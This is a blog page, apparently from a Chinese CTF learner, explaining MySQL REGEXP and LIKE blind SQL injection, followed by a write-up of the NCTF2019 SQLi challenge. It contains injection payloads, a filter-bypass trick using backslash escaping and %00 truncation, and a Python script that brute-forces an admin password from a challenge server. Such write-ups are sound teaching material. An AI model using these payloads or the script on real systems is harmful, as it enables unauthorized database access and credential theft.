@@ -1,0 +1,605 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Yu ting">
+  <meta name="keywords" content="">
+  <title>REGEXP注入与LIKE注入 - liquor&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"liquor-boop.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="REGEXP注入与LIKE注入">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-08-01 17:48" pubdate>
+        August 1, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      26
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">REGEXP注入与LIKE注入</h1>
+            
+            <div class="markdown-body">
+              <h1>REGEXP注入与LIKE注入</h1>
+<h3 id="REGEXP注入"><a class="header-anchor" href="#REGEXP注入">🍭</a>REGEXP注入</h3>
+<p>REGEXP注入，即regexp正则表达式注入，又叫盲注值正则表达式攻击。</p>
+<h4 id="注入原理"><a class="header-anchor" href="#注入原理">🍭</a>注入原理</h4>
+<p>直接查询自己需要的数据，然后通过正则表达式进行匹配。</p>
+<p>格式：</p>
+<pre><code class="hljs autoit"><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span>语句) regexp <span class="hljs-string">&#x27;正则&#x27;</span></code></pre>
+<p>若匹配则返回1，不匹配返回0</p>
+<pre><code class="hljs sql"><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">1</span>) regexp <span class="hljs-string">&#x27;^a&#x27;</span>;</code></pre>
+<p><code>^</code>表示pattern(模式串)的开头。即若匹配到username字段下id=1的数据开头为a，则返回1；否则返回0</p>
+<p>regexp关键字可以代替where条件里的=号</p>
+<pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">password</span> regexp <span class="hljs-string">&#x27;^ad&#x27;</span>;</code></pre>
+<img src="/2021/08/01/regexp/1.png" srcset="/img/loading.gif" alt="1" style="zoom:80%;">
+<blockquote>
+<p>过滤了=、in、like时可使用，<code>^</code>若被过滤，可使用<code>$</code>从后往前进行匹配</p>
+</blockquote>
+<p>常用regexp正则语句：</p>
+<pre><code class="hljs sql">regexp &#x27;^[a-z]&#x27;  <span class="hljs-comment">#判断一个表的第一个字符串是否在a-z中</span>
+regexp &#x27;^r&#x27;      <span class="hljs-comment">#判断第一个字符串是否为r</span>
+regexp &#x27;^r[a-z]&#x27; <span class="hljs-comment">#判断一个表的第二个字符串是否在a-z中</span></code></pre>
+<p>盲注：</p>
+<pre><code class="hljs pgsql"><span class="hljs-string">&#x27; or database() regexp &#x27;</span>^s<span class="hljs-string">&#x27;--+ </span>
+<span class="hljs-string">&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">database</span>() regexp <span class="hljs-string">&#x27;y$&#x27;</span><span class="hljs-comment">--+ </span></code></pre>
+<p>用双反斜杠（<code>\\</code>）来引用元字符（具有特殊含义的字符）</p>
+<p>常用引用元字符：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">字符</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">[]</td>
+<td style="text-align:left">左右方括号用于指定<strong>字符类</strong>。字符类是进行匹配时所要依据的一组字符。除连字符 (-) 和脱字符 (^) 外，在字符类中指定的元字符和量词（如 * 和 {m}，分别为元字符和量词）没有特殊意义，可当作实际字符进行运算。</td>
+</tr>
+<tr>
+<td style="text-align:center">*</td>
+<td style="text-align:left">星号可用于与字符匹配 0 次或多次。例如，<code>REGEXP '.*abc'</code> 匹配的字符串以 abc 结尾并以任何前缀开头。因此，aabc、xyzabc 和 abc 匹配，但 bc 和 abcc 则不匹配。</td>
+</tr>
+<tr>
+<td style="text-align:center">？</td>
+<td style="text-align:left">问号可用于与字符匹配 0 次或 1 次。例如，<code>'colou?r'</code> 匹配 color 和 colour。</td>
+</tr>
+<tr>
+<td style="text-align:center">+</td>
+<td style="text-align:left">加号可用于与字符匹配 1 次或多次。例如，<code>'bre+'</code> 匹配 bre 和 bree，但不匹配 br。</td>
+</tr>
+<tr>
+<td style="text-align:center">-</td>
+<td style="text-align:left">可以在字符类中使用一个连字符来表示一个范围。例如，<code>REGEXP '[a-e]'</code> 匹配 a、b、c、d 和 e。</td>
+</tr>
+<tr>
+<td style="text-align:center">%</td>
+<td style="text-align:left">百分号可与 SIMILAR TO 配合使用来匹配任意数目的字符。不将百分号视为 REGEXP 和 REGEXP_SUBSTR 所使用的元字符。当指定时，它匹配百分号 (%)。</td>
+</tr>
+<tr>
+<td style="text-align:center">_</td>
+<td style="text-align:left">可将下划线与 SIMILAR TO 配合使用来匹配单个字符。不将下划线视为 REGEXP 和 REGEXP_SUBSTR 所使用的元字符。当指定时，它匹配下划线 (_)。</td>
+</tr>
+<tr>
+<td style="text-align:center">|</td>
+<td style="text-align:left">管道符号用于指定匹配字符串时要使用的替代模式。在由竖线分隔的一行模式中，竖线被解释为 OR，匹配过程从最左侧的模式开始，在找到第一个匹配项时停止。因此，您应按优先级的降序顺序列出模式。您可以指定任意数量的替代模式。</td>
+</tr>
+<tr>
+<td style="text-align:center">()</td>
+<td style="text-align:left">当左括号和右括号用于正则表达式的各个组合部分时，它们为元字符。例如，<code>(ab)*</code> 匹配零个或多个 ab 的重复项。与使用数学表达式一样，您使用组合来控制正则表达式各部分的计算顺序。</td>
+</tr>
+<tr>
+<td style="text-align:center">{}</td>
+<td style="text-align:left">当左大括号和右大括号用于指定量词时，它们为元字符。量词指定一个模式要构成某个匹配所必须重复的次数。例如：<br>{m}   匹配某个字符正好 m 次。例如，‘519-[0-9]{3}-[0-9]{4}’ 匹配 519 地区号中的一个电话号码（假定数据按语法中定义的方式进行格式设置）。<br><br>{m,}   匹配某个字符至少 m 次。例如，‘[0-9]{5,}’ 匹配任何含有五个或更多数字的字符串。<br><br>{m,n}   匹配某个字符至少 m 次，但不超过 n 次。例如，SIMILAR TO ‘_{5,10}’ 匹配任何含有 5 到 10（含 5 和 10）个字符的字符串。<br></td>
+</tr>
+<tr>
+<td style="text-align:center">\</td>
+<td style="text-align:left">反斜线被用作元字符的转义字符。它也可被用于转义非元字符。</td>
+</tr>
+<tr>
+<td style="text-align:center">^</td>
+<td style="text-align:left">匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 ‘\n’ 或 ‘\r’ 之后的位置。</td>
+</tr>
+<tr>
+<td style="text-align:center">$</td>
+<td style="text-align:left">匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 ‘\n’ 或 ‘\r’ 之前的位置。</td>
+</tr>
+<tr>
+<td style="text-align:center">.</td>
+<td style="text-align:left">匹配除 “\n” 之外的任何单个字符。要匹配包括 ‘\n’ 在内的任何字符，请使用象 ‘[.\n]’ 的模式。</td>
+</tr>
+<tr>
+<td style="text-align:center">:</td>
+<td style="text-align:left">在字符集中使用冒号来指定子字符类。例如，<code>'[[:alnum:]]'</code></td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>多数正则表达式实现使用单个反斜杠转义特殊字符，一遍能使用这些字符本身，但是MySQL要求两个反斜杠（MySQL自己解释一个，正则表达式库解释另一个）。</li>
+<li>^ 符号的双重用途： ^在集合中（用 [ ] 定义）时用它来否定该集合，否则用来指定串的开始处。</li>
+</ul>
+<p>表达式顺序</p>
+<p><code>'^e[a-z]' -&gt; '^em[a-z]' -&gt; '^ema[a-z]' -&gt; '^emai[a-z]'-&gt; '^email[a-z]' -&gt; FALSE</code></p>
+<p>实验表明：在limit 0,1下，regexp会匹配所有的项。我们在使用regexp时，要注意有可能有多个项，同时要一个个字符去爆破。如：where table_schema=‘security’ limit 0,1。table_schema='security’已经起到了限定作用了，limit有没有已经不重要了</p>
+<h3 id="LIKE注入"><a class="header-anchor" href="#LIKE注入">🍭</a>LIKE注入</h3>
+<p><strong>like匹配</strong><br>
+百分比(%)通配符允许匹配任何字符串的零个或多个字符。下划线<code>_</code>通配符允许匹配任何单个字符。</p>
+<p>like 's%'判断第一个字符是否为s</p>
+<pre><code class="hljs crystal"><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,<span class="hljs-title">database</span>() <span class="hljs-title">like</span> &#x27;<span class="hljs-title">s</span>%&#x27;,3 --+</span></code></pre>
+<p>.like 'se%'判断前面两个字符串是否为se</p>
+<pre><code class="hljs crystal"><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,<span class="hljs-title">database</span>() <span class="hljs-title">like</span> &#x27;<span class="hljs-title">se</span>%&#x27;,3 --+</span></code></pre>
+<p>like ‘%se%’ 判断是否包含se两个字符串</p>
+<pre><code class="hljs crystal"><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,<span class="hljs-title">database</span>() <span class="hljs-title">like</span> &#x27;%<span class="hljs-title">se</span>%&#x27;,3 --+</span></code></pre>
+<p>like '_____'判断是否为5个字符</p>
+<pre><code class="hljs crystal"><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,<span class="hljs-title">database</span>() <span class="hljs-title">like</span> &#x27;<span class="hljs-title">_____</span>&#x27;,3 --+</span></code></pre>
+<p>like ‘s____’ 判断第一个字符是否为s</p>
+<pre><code class="hljs crystal"><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,<span class="hljs-title">database</span>() <span class="hljs-title">like</span> &#x27;<span class="hljs-title">s____</span>&#x27;,3 --+</span></code></pre>
+<p>盲注:</p>
+<blockquote>
+<p>判断数据库长度<br>
+可用length()函数，也可用_，如：<code>' or database() like '________'--+</code><br>
+判断数据库名</p>
+<p><code>' or database() like 's%'--+</code>也可用<code>' or database() like 's_______'--+</code></p>
+</blockquote>
+<p>表达式的顺序：</p>
+<p><code>'^e[a-z]' -&gt; '^em[a-z]' -&gt; '^ema[a-z]' -&gt; '^emai[a-z]'-&gt; '^email[a-z]' -&gt; TRUE</code></p>
+<p>之所以表达式 news[a-z]查询后返回正确是应为%代表0-n个字符，使用&quot;_&quot;则只能代表一个字符。故确认后续是否还有字符用如下表达式</p>
+<p><code>'email%' TRUE -&gt; 'email_' FALSE</code></p>
+<p>同理可以用相同的方法获取字段，值。</p>
+<h4 id="LIKE-和-REGEXP之间的差别"><a class="header-anchor" href="#LIKE-和-REGEXP之间的差别">🍭</a>LIKE 和 REGEXP之间的差别</h4>
+<p>LIKE 匹配整个列，如果被匹配的文本在列值中出现，LIKE 将不会找到它，相应的行也不会被返回（除非使用通配符）。而 REGEXP 在列值内进行匹配，如果被匹配的文本在列值中出现，REGEXP 将会找到它，相应的行将被返回，并且 REGEXP 能匹配整个列值（与 LIKE 相同的作用）。</p>
+<h1>[NCTF2019]SQLi</h1>
+<p>主页是一个登录框 。把sql语句显示出来了:</p>
+<p><img src="/2021/08/01/regexp/2.png" srcset="/img/loading.gif" alt="2"></p>
+<p>信息搜集，robots.txt，有个hint.txt</p>
+<pre><code class="hljs sql">$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|<span class="hljs-keyword">select</span>|<span class="hljs-keyword">greatest</span>|%<span class="hljs-number">00</span>|\<span class="hljs-string">&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;</span>
+<span class="hljs-string">If $_POST[&#x27;</span>passwd<span class="hljs-string">&#x27;] === admin&#x27;</span>s <span class="hljs-keyword">password</span>,
+<span class="hljs-keyword">Then</span> you will <span class="hljs-keyword">get</span> the flag;</code></pre>
+<p>密码等于admin密码即可获得flag。并没有对用户名做限制，由于单引号被禁用，使用 \ 转义and前面的那个单引号，使得<code>'\' and passwd='</code>形成闭合,构造passwd处为<code> ||/**/passwd/**/regexp/**/&quot;^a&quot;;%00</code><br>
+用regexp查询passwd ^匹配字符串开头 %00截断后面的内容，需要抓包提交（直接提交，会被url encode 变为%2500被黑名单拦截）即为 <code>username=\&amp;passwd=||/**/passwd/**/regexp/**/&quot;^a&quot;;%00</code><br>
+查询语句变为: <code>select * from users where username='\' and passwd='||/**/passwd/**/regexp</code><br>
+用<code> username='\' and passwd='||1;%00'</code>测试条件为真时就会跳转到web.php;(fuzz也可以) 条件为假时就会回到登陆页。</p>
+<p>脚本跑一下密码：</p>
+<pre><code class="hljs xl"><span class="hljs-keyword">import</span> requests
+from urllib <span class="hljs-keyword">import</span> parse
+<span class="hljs-keyword">import</span> string
+<span class="hljs-keyword">import</span> <span class="hljs-built_in">time</span>
+str1 = string.ascii_letters+<span class="hljs-string">&#x27;_&#x27;</span>+string.digits
+url=<span class="hljs-string">&#x27;http://9d86404e-b5c0-41ff-b8ef-f9bbf6da8e8c.node3.buuoj.cn/index.php&#x27;</span>
+flag=<span class="hljs-string">&#x27;79&#x27;</span>
+a=parse.unquote(<span class="hljs-string">&#x27;%00&#x27;</span>)
+<span class="hljs-keyword">for</span> i <span class="hljs-built_in">in</span> range(<span class="hljs-number">50</span>):
+    <span class="hljs-keyword">for</span> i <span class="hljs-built_in">in</span> str1:
+        <span class="hljs-keyword">data</span>=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,
+              <span class="hljs-string">&quot;passwd&quot;</span>:<span class="hljs-string">&quot;||passwd/**/regexp/**/0x&quot;</span>+flag+hex(ord(i)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)+<span class="hljs-string">&quot;;&quot;</span>+a
+            &#125;
+        r=requests.post(url=url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>)
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;welcome.php&#x27;</span> <span class="hljs-built_in">in</span> r.<span class="hljs-keyword">text</span>:
+            flag+=hex(ord(i)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)
+            print(flag)
+            break
+        <span class="hljs-built_in">time</span>.sleep(<span class="hljs-number">0.5</span>)
+        #防止<span class="hljs-number">429</span></code></pre>
+<p>用密码登录即可获得flag</p>
+<p><img src="/2021/08/01/regexp/3.png" srcset="/img/loading.gif" alt="3"></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36761831/article/details/82862135">https://blog.csdn.net/qq_36761831/article/details/82862135</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35569814/article/details/100526540">https://blog.csdn.net/qq_35569814/article/details/100526540</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43610673/article/details/106029042">https://blog.csdn.net/weixin_43610673/article/details/106029042</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%B3%A8%E5%85%A5/">注入</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/08/02/tiny/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">buu（五）</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/07/30/black/">
+                        <span class="hidden-mobile">buu（四）</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
